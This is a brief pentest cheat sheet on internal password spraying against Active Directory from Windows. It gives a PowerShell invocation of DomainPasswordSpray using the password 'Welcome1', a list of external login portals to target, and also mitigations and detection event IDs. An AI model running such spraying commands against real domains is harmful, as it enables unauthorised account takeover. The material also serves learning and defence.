# Internal Password Spraying - from Windows

## DomainPasswordSpray

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---

## Mitigations

* Enable MFA
* Enforce least privilege and segment networks
* Require strong passwords and apply password filters
* Use separate admin and user accounts

---

## Detection

Monitor Windows event logs:

* **4625** - Failed logon
* **4771** - Kerberos pre-authentication failure

---

## External Password Spraying Targets

* Microsoft 365, Outlook Web
* RDS portals, Citrix, VMware Horizon
* VPN portals (Fortinet, SonicWall, OpenVPN)
* Web applications using AD authentication
